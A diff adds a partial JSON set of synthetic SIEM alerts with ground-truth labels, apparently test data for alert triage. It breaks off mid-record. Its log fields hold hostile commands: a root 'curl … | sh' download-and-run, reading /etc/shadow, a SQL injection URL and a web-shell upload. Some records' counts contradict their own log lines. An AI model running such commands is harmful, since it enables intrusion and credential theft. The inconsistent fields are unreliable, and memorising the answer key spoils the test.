@@ -1,0 +1,3425 @@
+[
+  {
+    "id": "N-001",
+    "timestamp": "2026-11-06T05:32:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "203.0.113.117",
+      "bytes_out_mb": 1367
+    },
+    "full_log": "netflow: 10.0.4.40 -> 203.0.113.117 1367 MB over 443 in 20 min",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "exfiltration",
+      "rationale": "Large transfer from a data server to an unknown external IP."
+    }
+  },
+  {
+    "id": "N-002",
+    "timestamp": "2026-11-04T09:14:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "198.51.100.50",
+      "srcuser": "test",
+      "attempts": 262
+    },
+    "full_log": "sshd: 64 failed logins for invalid users from 198.51.100.50 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-003",
+    "timestamp": "2026-11-04T12:17:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.235",
+      "srcuser": "test",
+      "attempts": 94
+    },
+    "full_log": "sshd: 127 failed logins for invalid users from 203.0.113.235 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-004",
+    "timestamp": "2026-11-02T15:47:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.10.9",
+      "srcuser": "hali"
+    },
+    "full_log": "sshd[8219]: Failed password for hali from 10.0.10.9 port 43951 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-005",
+    "timestamp": "2026-11-02T22:42:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 465
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.1.11: 864 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-006",
+    "timestamp": "2026-11-06T08:12:00Z",
+    "rule": {
+      "id": "554",
+      "level": 7,
+      "description": "File added to the system.",
+      "groups": [
+        "ossec",
+        "syscheck"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "file": "/var/www/html/upload/shell.php",
+      "changed_by": "www-data"
+    },
+    "full_log": "syscheck: new file /var/www/html/upload/shell.php by www-data",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "webshell_upload",
+      "rationale": "Web user dropped a PHP file in an upload folder: likely web shell."
+    }
+  },
+  {
+    "id": "N-007",
+    "timestamp": "2026-11-03T02:39:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "198.51.100.240",
+      "url": "/robots.txt",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
+    },
+    "full_log": "198.51.100.240 - - \"GET /robots.txt HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-008",
+    "timestamp": "2026-11-05T14:20:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcuser": "hali",
+      "dstuser": "support01",
+      "hour_local": 3
+    },
+    "full_log": "useradd[4417]: new user: name=support01, UID=0 (created by hali at night)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "offhours_new_root_user",
+      "rationale": "Non-admin creating a UID 0 account at night: persistence."
+    }
+  },
+  {
+    "id": "N-009",
+    "timestamp": "2026-11-02T21:33:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 212
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.3.30: 744 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-010",
+    "timestamp": "2026-11-03T16:16:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "package": "nginx",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed nginx (source updates.example.com, change ticket CHG-9008)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-011",
+    "timestamp": "2026-11-02T23:53:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.48",
+      "url": "/robots.txt",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "203.0.113.48 - - \"GET /robots.txt HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-012",
+    "timestamp": "2026-11-02T18:40:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 697
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.4.40: 417 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-013",
+    "timestamp": "2026-11-02T19:43:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 893
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.4.40: 925 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-014",
+    "timestamp": "2026-11-04T18:50:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.25",
+      "srcuser": "mgarcia",
+      "failures_before_success": 59
+    },
+    "full_log": "sshd: Accepted password for mgarcia from 198.51.100.25 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-015",
+    "timestamp": "2026-11-06T04:15:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.2.20",
+      "dstip": "198.51.100.174",
+      "bytes_out_mb": 7342
+    },
+    "full_log": "netflow: 10.0.2.20 -> 198.51.100.174 7342 MB over 443 in 20 min",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "exfiltration",
+      "rationale": "Large transfer from a data server to an unknown external IP."
+    }
+  },
+  {
+    "id": "N-016",
+    "timestamp": "2026-11-05T22:56:00Z",
+    "rule": {
+      "id": "100210",
+      "level": 10,
+      "description": "DNS query to domain on threat-intel blocklist.",
+      "groups": [
+        "dns",
+        "threat_intel"
+      ]
+    },
+    "agent": {
+      "name": "ws-002",
+      "ip": "10.0.10.2"
+    },
+    "data": {
+      "query": "files-share.dl-mirror.test",
+      "srcip": "10.0.10.2"
+    },
+    "full_log": "dns: 10.0.10.2 queried files-share.dl-mirror.test (matched threat feed)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "dns_threat_intel",
+      "rationale": "Workstation contacted a domain on a threat-intelligence blocklist."
+    }
+  },
+  {
+    "id": "N-017",
+    "timestamp": "2026-11-06T04:57:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "203.0.113.3",
+      "bytes_out_mb": 8041
+    },
+    "full_log": "netflow: 10.0.4.40 -> 203.0.113.3 8041 MB over 443 in 20 min",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "exfiltration",
+      "rationale": "Large transfer from a data server to an unknown external IP."
+    }
+  },
+  {
+    "id": "N-018",
+    "timestamp": "2026-11-04T11:09:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "203.0.113.51",
+      "srcuser": "root",
+      "attempts": 187
+    },
+    "full_log": "sshd: 70 failed logins for invalid users from 203.0.113.51 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-019",
+    "timestamp": "2026-11-06T07:06:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.2.20",
+      "dstip": "198.51.100.17",
+      "bytes_out_mb": 6802
+    },
+    "full_log": "netflow: 10.0.2.20 -> 198.51.100.17 6802 MB over 443 in 20 min",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "exfiltration",
+      "rationale": "Large transfer from a data server to an unknown external IP."
+    }
+  },
+  {
+    "id": "N-020",
+    "timestamp": "2026-11-02T10:29:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "10.0.10.39",
+      "srcuser": "jsmith"
+    },
+    "full_log": "sshd[3893]: Failed password for jsmith from 10.0.10.39 port 51541 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-021",
+    "timestamp": "2026-11-03T13:04:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "dstuser": "cjones",
+      "hour_local": 10
+    },
+    "full_log": "useradd: new user: name=cjones, UID=1777 (created by it_admin, ticket HR-3352)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "onboarding_new_user",
+      "rationale": "Admin creating a normal account in work hours with an HR ticket."
+    }
+  },
+  {
+    "id": "N-022",
+    "timestamp": "2026-11-02T20:39:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 935
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.3.30: 412 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-023",
+    "timestamp": "2026-11-03T01:29:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.78",
+      "url": "/favicon.ico",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "198.51.100.78 - - \"GET /favicon.ico HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-024",
+    "timestamp": "2026-11-02T13:43:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.10.8",
+      "srcuser": "kpatel"
+    },
+    "full_log": "sshd[8167]: Failed password for kpatel from 10.0.10.8 port 60418 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-025",
+    "timestamp": "2026-11-05T19:39:00Z",
+    "rule": {
+      "id": "87105",
+      "level": 12,
+      "description": "VirusTotal: Alert - file detected as malicious by multiple engines.",
+      "groups": [
+        "virustotal"
+      ]
+    },
+    "agent": {
+      "name": "ws-031",
+      "ip": "10.0.10.31"
+    },
+    "data": {
+      "file": "C:\\Users\\rnguyen\\Downloads\\setup_crack.exe",
+      "positives": 24,
+      "total": 70
+    },
+    "full_log": "VirusTotal: setup_crack.exe flagged by 51/70 engines",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "malware_download",
+      "rationale": "File flagged by many AV engines on a workstation."
+    }
+  },
+  {
+    "id": "N-026",
+    "timestamp": "2026-11-04T18:30:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "203.0.113.108",
+      "srcuser": "alee",
+      "failures_before_success": 72
+    },
+    "full_log": "sshd: Accepted password for alee from 203.0.113.108 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-027",
+    "timestamp": "2026-11-03T15:23:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "package": "nginx",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed nginx (source updates.example.com, change ticket CHG-7683)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-028",
+    "timestamp": "2026-11-04T05:28:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.2.20",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 2685,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.2.20 -> 10.0.4.41 2685 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-029",
+    "timestamp": "2026-11-04T20:26:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.49",
+      "srcuser": "alee",
+      "failures_before_success": 53
+    },
+    "full_log": "sshd: Accepted password for alee from 203.0.113.49 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-030",
+    "timestamp": "2026-11-02T09:21:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "10.0.10.37",
+      "srcuser": "rnguyen"
+    },
+    "full_log": "sshd[4201]: Failed password for rnguyen from 10.0.10.37 port 55359 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-031",
+    "timestamp": "2026-11-06T03:48:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "198.51.100.180",
+      "bytes_out_mb": 1708
+    },
+    "full_log": "netflow: 10.0.4.40 -> 198.51.100.180 1708 MB over 443 in 20 min",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "exfiltration",
+      "rationale": "Large transfer from a data server to an unknown external IP."
+    }
+  },
+  {
+    "id": "N-032",
+    "timestamp": "2026-11-05T06:19:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.187",
+      "url": "/products.php?id=1' OR '1'='1",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+    },
+    "full_log": "198.51.100.187 - - \"GET /products.php?id=1' OR '1'='1 HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-033",
+    "timestamp": "2026-11-02T08:17:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.10.4",
+      "srcuser": "rnguyen"
+    },
+    "full_log": "sshd[2745]: Failed password for rnguyen from 10.0.10.4 port 46484 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-034",
+    "timestamp": "2026-11-05T02:52:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.158",
+      "url": "/products.php?id=1' OR '1'='1",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
+    },
+    "full_log": "203.0.113.158 - - \"GET /products.php?id=1' OR '1'='1 HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-035",
+    "timestamp": "2026-11-03T02:34:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "198.51.100.60",
+      "url": "/images/logo2.png",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "198.51.100.60 - - \"GET /images/logo2.png HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-036",
+    "timestamp": "2026-11-05T12:09:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcuser": "pmartin",
+      "command": "/bin/cat /etc/shadow"
+    },
+    "full_log": "sudo: pmartin : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "suspicious_sudo",
+      "rationale": "Non-admin running a credential-theft or download-and-run command as root."
+    }
+  },
+  {
+    "id": "N-037",
+    "timestamp": "2026-11-02T14:10:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.10.18",
+      "srcuser": "jsmith"
+    },
+    "full_log": "sshd[3474]: Failed password for jsmith from 10.0.10.18 port 62370 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-038",
+    "timestamp": "2026-11-03T09:53:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "command": "/usr/bin/apt update"
+    },
+    "full_log": "sudo: it_admin : TTY=pts/0 ; PWD=/home/it_admin ; USER=root ; COMMAND=/usr/bin/apt update",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-039",
+    "timestamp": "2026-11-04T01:03:00Z",
+    "rule": {
+      "id": "100211",
+      "level": 3,
+      "description": "DNS query to newly observed domain.",
+      "groups": [
+        "dns"
+      ]
+    },
+    "agent": {
+      "name": "ws-008",
+      "ip": "10.0.10.8"
+    },
+    "data": {
+      "query": "updates.example.com",
+      "srcip": "10.0.10.8"
+    },
+    "full_log": "dns: 10.0.10.8 queried updates.example.com (first seen today)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "dns_known_good",
+      "rationale": "Domain is on the approved domain list."
+    }
+  },
+  {
+    "id": "N-040",
+    "timestamp": "2026-11-04T01:50:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 10365,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.4.40 -> 10.0.4.41 10365 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-041",
+    "timestamp": "2026-11-05T08:37:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcuser": "ekim",
+      "command": "/usr/bin/curl http://198.51.100.7/x.sh | sh"
+    },
+    "full_log": "sudo: ekim : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.7/x.sh | sh",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "suspicious_sudo",
+      "rationale": "Non-admin running a credential-theft or download-and-run command as root."
+    }
+  },
+  {
+    "id": "N-042",
+    "timestamp": "2026-11-02T21:23:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 672
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.1.10: 276 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-043",
+    "timestamp": "2026-11-05T17:38:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "lchen",
+      "dstuser": "helpdesk_tmp",
+      "hour_local": 1
+    },
+    "full_log": "useradd[5527]: new user: name=helpdesk_tmp, UID=0 (created by lchen at night)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "offhours_new_root_user",
+      "rationale": "Non-admin creating a UID 0 account at night: persistence."
+    }
+  },
+  {
+    "id": "N-044",
+    "timestamp": "2026-11-03T22:51:00Z",
+    "rule": {
+      "id": "100211",
+      "level": 3,
+      "description": "DNS query to newly observed domain.",
+      "groups": [
+        "dns"
+      ]
+    },
+    "agent": {
+      "name": "ws-025",
+      "ip": "10.0.10.25"
+    },
+    "data": {
+      "query": "cdn.example.com",
+      "srcip": "10.0.10.25"
+    },
